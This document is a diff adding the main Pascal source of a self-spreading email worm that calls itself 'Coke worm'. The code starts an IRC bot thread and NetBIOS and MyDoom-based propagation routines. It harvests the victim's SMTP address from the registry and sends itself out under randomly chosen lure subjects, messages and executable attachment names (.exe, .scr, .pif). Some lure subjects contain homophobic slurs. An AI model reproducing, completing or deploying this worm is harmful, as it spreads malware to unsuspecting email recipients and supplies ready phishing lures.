@@ -1,0 +1,464 @@
+   program FYL;
+   uses
+     Windows, uNetBios, ElfBot,
+     uMyDoom,
+     Zip, mail in 'mail.pas';
+
+   begin
+
+   CreateMutexA(Nil, True, 'COKE_WUBS_YOU');
+   If GetLastError() = Error_ALready_Exists Then
+    ExitProcess(0);
+
+    CreateThread(NIL, 0, @Start_irc, NIL, 0, A);
+
+    startnetbios(40);
+    startmydoom(40);
+
+    AssignFile(F, 'C:\Coke.txt');
+    ReWrite(F);
+    WriteLn(F, 'Coke worm is here to join the party');
+    WriteLn(F, 'Notice to others :');
+    WriteLn(F, 'Fuck you Bagel Your just a lucky ScriptKiddie');
+    WriteLn(F, 'Fuck you MyDoom Your just a lame retard');
+    WriteLn(F, 'Fuck you SkyNet You had luck to get into F-Sec mail-list, nothing special tho.');
+    WriteLn(F, 'You cant code worms, your not worth to be called coders.');
+    CloseFile(F);
+
+    Randomize;
+    Case Random(3) Of
+     0: GetSystemDirectory(fDir, 255);
+     1: GetWindowsDirectory(fDir, 255);
+     2: GetTempPathA(255, fDir);
+    End;
+    Path := fDir;
+    Path := Path + '\';
+
+    // HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\             00000003
+    If GetRegValue(HKEY_CURRENT_USER,'Software\Microsoft\Internet Account Manager\Accounts\00000001','SMTP Email Address') <>
+       '' Then fMail := GetRegValue(HKEY_CURRENT_USER,'Software\Microsoft\Internet Account Manager\Accounts\00000001','SMTP Email Address');
+    If fMail = '' Then
+    If GetRegValue(HKEY_CURRENT_USER,'Software\Microsoft\Internet Account Manager\Accounts\00000002','SMTP Email Address') <>
+       '' Then fMail := GetRegValue(HKEY_CURRENT_USER,'Software\Microsoft\Internet Account Manager\Accounts\00000002','SMTP Email Address');
+    If fMail = '' Then
+    If GetRegValue(HKEY_CURRENT_USER,'Software\Microsoft\Internet Account Manager\Accounts\00000003','SMTP Email Address') <>
+       '' Then fMail := GetRegValue(HKEY_CURRENT_USER,'Software\Microsoft\Internet Account Manager\Accounts\00000003','SMTP Email Address');
+    If fMail = '' Then
+    If GetRegValue(HKEY_CURRENT_USER,'Software\Microsoft\Internet Account Manager\Accounts\00000004','SMTP Email Address') <>
+       '' Then fMail := GetRegValue(HKEY_CURRENT_USER,'Software\Microsoft\Internet Account Manager\Accounts\00000004','SMTP Email Address');
+
+    If fMail = '' Then
+     fMail := GetRMail;
+
+    Randomize;
+    Case Random(165) Of
+     0 : fSubj := 'Your details';
+     1 : fSubj := 'Your File';
+     2 : fSubj := 'Your document';
+     3 : fSubj := 'eCard sent to you';
+     4 : fSubj := 'My File';
+     5 : fSubj := 'Your picture';
+     6 : fSubj := 'My picture';
+     7 : fSubj := 'You got a pic ?';
+     8 : fSubj := 'You got image ?';
+     9 : fSubj := 'You got picture?';
+     10: fSubj := 'Pic?';
+     11: fSubj := 'Image?';
+     12: fSubj := 'File?';
+     13: fSubj := 'File!';
+     14: fSubj := 'Document!';
+     15: fSubj := 'The document';
+     16: fSubj := 'Yours';
+     17: fSubj := 'New document';
+     18: fSubj := 'New File';
+     19: fSubj := 'Your ZIP';
+     20: fSubj := 'My private pics';
+     21: fSubj := 'My private files';
+     22: fSubj := 'My private images';
+     23: fSubj := 'My private documents';
+     24: fSubj := 'My private textes';
+     25: fSubj := 'the text';
+     26: fSubj := 'the poem';
+     27: fSubj := 'a Poem';
+     28: fSubj := 'a Text';
+     29: fSubj := 'a Picture';
+     30: fSubj := 'a Image';
+     31: fSubj := 'My Text';
+     32: fSubj := 'My Poem';
+     33: fSubj := 'Did you like my poem?';
+     34: fSubj := 'Did you like my text?';
+     35: fSubj := '2 Poem';
+     36: fSubj := 'some text';
+     37: fSubj := 'whos picture ?';
+     38: fSubj := 'a Joke';
+     39: fSubj := 'Image of you';
+     40: fSubj := 'Links';
+     41: fSubj := 'profile';
+     42: fSubj := 'your profile';
+     43: fSubj := 'Its me :)';
+     44: fSubj := 'Im back :D';
+     45: fSubj := 'hello dude';
+     46: fSubj := 'whats up?';
+     47: fSubj := 'sup ?';
+     48: fSubj := 'i got a problem';
+     49: fSubj := 'warning, its me';
+     50: fSubj := 'warning, im hot';
+     51: fSubj := 'shit man :P';
+     52: fSubj := 'haha there you are';
+     53: fSubj := 'ive searched for you :D';
+     54: fSubj := 'wow, im so cool';
+     55: fSubj := 'what you want ?';
+     56: fSubj := 'hey, stop buggin me';
+     57: fSubj := 'is it just me?';
+     58: fSubj := 'great';
+     59: fSubj := 'doesnt matter to me';
+     60: fSubj := 'which u want?';
+     61: fSubj := 'gr8 :)';
+     62: fSubj := 'hahahahahahaha :D';
+     63: fSubj := 'are you jesus? ;D';
+     64: fSubj := 'she said what i was supposed to think :P';
+     65: fSubj := 'Cute, Boring, Love.';
+     66: fSubj := 'cute boring love :P';
+     67: fSubj := 'its whats its all about';
+     68: fSubj := 'i like apple juice';
+     69: fSubj := 'coke just rules done you think ?';
+     70: fSubj := 'i want to trademark';
+     71: fSubj := 'i want to own you';
+     72: fSubj := 'i want you';
+     73: fSubj := 'i want to have you';
+     74: fSubj := 'dont you longing for purity ?';
+     75: fSubj := 'dont you ever gets so sick of territories ?';
+     76: fSubj := 'i am naked';
+     77: fSubj := 'man im nude';
+     78: fSubj := 'dude, im nude';
+     79: fSubj := ':P';
+     80: fSubj := ':)';
+     81: fSubj := '-';
+     82: fSubj := ':-)';
+     83: fSubj := ';-)';
+     84: fSubj := '=)';
+     85: fSubj := '>=)';
+     86: fSubj := ';D';
+     87: fSubj := 'what are you so scared of ?';
+     88: fSubj := 'sick of spam? so am i :/';
+     89: fSubj := 'shit shit shit';
+     90: fSubj := 'do you trust me?';
+     91: fSubj := 'do i trust you?';
+     92: fSubj := 'do you know me?';
+     93: fSubj := 'do i know you?';
+     94: fSubj := 'i eat glass :D';
+     95: fSubj := 'i can walk on the water';
+     96: fSubj := 'this is so sick man :D';
+     97: fSubj := 'check it out, its sick :D';
+     98: fSubj := 'WOW, powerlevel up :D';
+     99: fSubj := 'wow hahaha';
+     100: fSubj := 'wow, if this aint pron, then i dont know what it is';
+     101: fSubj := 'i made a mistake :(';
+     102: fSubj := 'is this a mistake ?';
+     103: fSubj := 'do you have a mistake ?';
+     104: fSubj := 'i made a mistake';
+     105: fSubj := 'are you intrested in making movies?';
+     106: fSubj := 'making movies ?';
+     107: fSubj := 'getting money?';
+     108: fSubj := 'i love money';
+     109: fSubj := 'do you love money?';
+     110: fSubj := 'i got a picture of you and me';
+     111: fSubj := 'i got a picture of you';
+     112: fSubj := 'i got a picture of me';
+     113: fSubj := 'you got a picture of us';
+     114: fSubj := 'you got a picture of me';
+     115: fSubj := 'you got a picture ?';
+     116: fSubj := 'i hate to be singel';
+     117: fSubj := 'i hate to not be lesbian';
+     118: fSubj := 'i hate to be gay';
+     119: fSubj := 'i hate to be a homosexual';
+     120: fSubj := 'i am a lesbian';
+     121: fSubj := 'i hate fags';
+     122: fSubj := 'are you a fag?';
+     123: fSubj := 'is this right mail?';
+     124: fSubj := 'is this james?';
+     125: fSubj := 'is this kirk?';
+     126: fSubj := 'is this kurt?';
+     127: fSubj := 'is this rutger?';
+     128: fSubj := 'is this stefan?';
+     129: fSubj := 'is this stephen?';
+     130: fSubj := 'is this mary?';
+     131: fSubj := 'is this julie?';
+     132: fSubj := 'is this ?';
+     133: fSubj := 'is ?';
+     134: fSubj := 'want to listen on some music?';
+     135: fSubj := 'oh yea, thats how i like it';
+     136: fSubj := 'how i like it';
+     137: fSubj := 'oh yea';
+     138: fSubj := 'im afraid';
+     139: fSubj := 'im not afraid';
+     140: fSubj := 'im afraid of dieing';
+     141: fSubj := 'im afraid of begin ignore';
+     142: fSubj := 'im afraid of feeling';
+     143: fSubj := 'im not afraid of trying';
+     144: fSubj := 'do you got msn?';
+     145: fSubj := 'do you got icq?';
+     146: fSubj := 'do you got aim?';
+     147: fSubj := 'do you got mail? :D';
+     148: fSubj := 'where is the sky?';
+     149: fSubj := 'i am hiding';
+     150: fSubj := 'noone knows, just u and i';
+     151: fSubj := 'just u and i';
+     152: fSubj := 'U and i';
+     153: fSubj := 'U + I';
+     154: fSubj := 'I + U';
+     155: fSubj := 'i see everything :D';
+     156: fSubj := ' ';
+     157: fSubj := 'Best i am';
+     158: fSubj := 'I am Best';
+     159: fSubj := 'Am best I';
+     160: fSubj := 'Am i Best';
+     161: fSubj := 'Best Am I';
+     162: fSubj := 'i Best Am';
+     163: fSubj := 'blah blah blah';
+     164: fSubj := 'words, i hate words';
+     165: fSubj := 'w0rd';
+    End;
+    Randomize;
+    Case Random(19) Of
+     5: fSubj := 'Re: '+fSubj;
+     6: fSubj := 're: '+fSubj;
+     7: fSubj := 'Fwd: '+fSubj;
+     8: fSubj := 'FWD: '+fSubj;
+    End;
+
+    Randomize;
+    Case Random(131) Of
+     0 : fName := '[1]eCard';
+     1 : fName := '[0]eCard';
+     2 : fName := 'Document';
+     3 : fName := 'YourFile';
+     4 : fName := 'Your Doc';
+     5 : fName := 'Textfile';
+     6 : fName := 'Profiles';
+     7 : fName := 'Tmp Docu';
+     8 : fName := 'ThisFile';
+     9 : fName := 'YourText';
+     10: fName := '1 Update';
+     11: fName := '3 Update';
+     12: fName := 'UrDetail';
+     13 : fName := 'NewEmail';
+     14 : fName := 'YourMail';
+     15 : fName := 'TheEmail';
+     16 : fName := 'tmpEMail';
+     17 : fName := 'tmpTexts';
+     18 : fName := 'tmpFiles';
+     19 : fName := 'tmpLogin';
+     20 : fName := 'tmpInfo0';
+     21 : fName := 'tmpInfo1';
+     22 : fName := 'tmpPics0';
+     23 : fName := 'Picture0';
+     24 : fName := 'Pictures';
+     25 : fName := 'Images00';
+     26 : fName := 'Images04';
+     27 : fName := 'MyImages';
+     28 : fName := 'My Image';
+     29 : fName := 'FileInfo';
+     30 : fName := 'InfoFile';
+     31 : fName := 'NewsFile';
+     32 : fName := 'FileNews';
+     33 : fName := 'FileTest';
+     34 : fName := 'FileText';
+     35 : fName := 'Testthis';
+     36 : fName := 'BetaFile';
+     37 : fName := 'TestTest';
+     38 : fName := 'ItsATest';
+     39 : fName := 'Test Pic';
+     40 : fName := 'Pic Test';
+     41 : fName := 'YourTest';
+     42 : fName := 'JPG Test';
+     43 : fName := 'Application';
+     44 : fName := 'Applications';
+     45 : fName := 'Details';
+     46 : fName := 'Your_Details';
+     47 : fName := 'My_Details';
+     48 : fName := 'Your_Profile';
+     49 : fName := 'Your_eCard';
+     50 : fName := 'A_eCard';
+     51 : fName := 'eCard';
+     52 : fName := 'eCard_30042';
+     53 : fName := 'eCard_30259';
+     54 : fName := 'eCard_20349';
+     55 : fName := 'Music';
+     56 : fName := 'MusicPlayer';
+     57 : fName := 'WinZipper';
+     58 : fName := 'ZipFile';
+     59 : fName := 'ZippedFiles';
+     60 : fName := 'ZipDoc';
+     61 : fName := 'ZippedDocs';
+     62 : fName := 'ZippedTexts';
+     63 : fName := 'ZippedPictures';
+     64 : fName := 'Pictures';
+     65 : fName := 'ZippedPictures';
+     66 : fName := 'RaredDocs';
+     67 : fName := 'RaredPictures';
+     68 : fName := 'RaredTexts';
+     69 : fName := 'RaredDocuments';
+     70 : fName := 'Image';
+     71 : fName := 'IMG_094385';
+     72 : fName := 'IMG_234502';
+     73 : fName := 'IMG_358996';
+     74 : fName := 'IMG_567567';
+     75 : fName := 'IMG_804325';
+     76 : fName := 'IMG_2318975';
+     77 : fName := 'IMG_2186395';
+     78 : fName := 'IMG_2194864';
+     79 : fName := 'IMG_0345486';
+     80 : fName := 'IMG_2384063';
+     81 : fName := 'IMG_34534953';
+     82 : fName := 'IMG_2349';
+     83 : fName := 'Jpeg_file';
+     84 : fName := 'ZippedJpeg';
+     85 : fName := 'Zip';
+     86 : fName := 'Zipped';
+     87 : fName := 'ZipFile';
+     88 : fName := 'RarFile';
+     89 : fName := 'Rar';
+     90 : fName := 'Rared';
+     91 : fName := 'RaredJpeg';
+     92 : fName := 'RaredMusic';
+     93 : fName := 'MusicRar';
+     94 : fName := 'Raw';
+     95 : fName := 'Your_Application';
+     96 : fName := 'Your_Details';
+     97 : fName := 'Your_Numbers';
+     98 : fName := 'Your_Login';
+     99 : fName := 'Your_SignIn';
+     100 : fName := 'Your_CardNumber';
+     101 : fName := 'Your_Info';
+     102 : fName := 'Info';
+     103 : fName := 'My_Info';
+     104 : fName := 'Info_Your';
+     105 : fName := 'PornFile';
+     106 : fName := 'PornZip';
+     107 : fName := 'ZippedPorn';
+     108 : fName := 'RarPorn';
+     109 : fName := 'RaredPorn';
+     110 : fName := 'Porn';
+     111 : fName := 'PornPic';
+     112 : fName := 'PictureFile';
+     113 : fName := 'PictureImageFormat';
+     114 : fName := 'LiveDie';
+     115 : fName := 'DieLive';
+     116 : fName := 'Die';
+     117 : fName := 'Live';
+     118 : fName := 'Life';
+     119 : fName := 'Death';
+     120 : fName := 'Smoke';
+     121 : fName := 'Weed';
+     122 : fName := 'Cigg';
+     123 : fName := 'WeedSmoke';
+     124 : fName := 'SmokeWeed';
+     125 : fName := 'CiggSmoke';
+     126 : fName := 'SmokeCigg';
+     127 : fName := 'CiggWeed';
+     128 : fName := 'WeedCigg';
+     129 : fName := 'Dare';
+     130 : fName := 'WhoDare';
+     131 : fName := 'DareWho';
+    End;
+
+     If (Pos('.', fName)=0) Then Begin
+
+      Randomize;
+      Balle := Random(100);
+
+      If (Balle < 10 ) And (Balle > 0) Then
+       fName := fName + '.exe';
+      If (Balle < 20 ) And (Balle > 10) Then
+       fName := fName + '.scr';
+      If (Balle < 30 ) And (Balle > 20) Then
+       fName := fName + '.cmd';
+      If (Balle < 40 ) And (Balle > 30) Then
+       fName := fName + '.com';
+      If (Balle < 50 ) And (Balle > 40) Then
+       fName := fName + '.bat';
+      If (Balle < 100 ) And (Balle > 50) Then
+       fName := fName + '.pif';
+
+      CopyFile(pChar(ParamStr(0)), pChar(Path+fName), False);
+      Randomize;
+      If Random(101) > 40 Then Begin
+       Zip_Make(Path+fName, Path+fName, fName);
+       DeleteFile(pChar(Path+fName));
+       fName := Copy(fName, 1, Length(fName)-3)+'zip';
+      end Else
+      DeleteFile(pChar(Path+fName));
+     End;
+     fName := Path + fName;
+    Randomize;
+    Case Random(63) Of
+     0 : fText := 'Can you please test this?';
+     1 : fText := 'test';
+     2 : fText := 'Test ?';
+     3 : fText := 'Is it working?';
+     4 : fText := 'Check the attachment :)';
+     5 : fText := 'Attachment :)';
+     6 : fText := 'Test the attachment :)';
+     7 : fText := 'Your details';
+     8 : fText := 'Ive added your files';
+     9 : fText := 'This is my pics';
+     10: fText := 'Pics';
+     11: fText := 'Pictures :)';
+     12: fText := 'Ive added some texts';
+     13: fText := 'Ive added a text';
+     14: fText := 'Ive added some documents';
+     15: fText := 'Ive added some pics';
+     16: fText := 'Ive added some tools';
+     17: fText := 'Ive added some files';
+     18: fText := 'Ive added a document';
+     19: fText := 'Ive added a picture';
+     20: fText := 'Ive added a image';
+     21: fText := 'Ive added a file';
+     22: fText := 'Check out your eCard';
+     23: fText := 'Someone sent you a eCard';
+     24: fText := 'You got a eCard';
+     25: fText := 'Its a eCard for you';
+     26: fText := 'Its a present';
+     27: fText := 'Look :)';
+     28: fText := 'Attachment';
+     29: fText := 'Open the attachment :D';
+     30: fText := 'Check the file';
+     31: fText := 'Check the added file';
+     32: fText := 'Look at the added file';
+     33: fText := 'Please, i cant find the error, can you check the file';
+     34: fText := 'Profiles';
+     35: fText := 'Your document';
+     36: fText := 'Ive sent your document';
+     37: fText := 'Is this kirk? if so i added our pictures';
+     38: fText := 'Is this george? if so ive added the pictures ;)';
+     39: fText := 'Its pcitures of me';
+     40: fText := 'Pics';
+     41: fText := 'What you like the picture?';
+     42: fText := 'What you like the file ?';
+     43: fText := 'Got this ?';
+     44: fText := 'You have this ?';
+     45: fText := 'Can you tell me what you think of it?';
+     46: fText := 'Look what a funny game i found :)';
+     47: fText := 'A funny game';
+     48: fText := 'ive added a screensaver for you';
+     49: fText := 'a screensaver, for you :)';
+     50: fText := 'Images of us last year';
+     51: fText := 'Do you remember these images ?';
+     52: fText := 'do you remember these pictures ?';
+     53: fText := 'Do you still have this file ?';
+     54: fText := 'I send the file you asked about';
+     55: fText := 'The file you asked about';
+     56: fText := 'Your file';
+     57: fText := 'Your details';
+     58: fText := 'Your document';
+     59: fText := 'Your textfile';
+     60: fText := 'Your image';
+     61: fText := 'Your picture';
+     62: fText := 'eCard picture.';
+    End;
+
+    ListFiles('C:\','*','*.*');
+    While 1<>2 do begin ; end;
+
+   end.
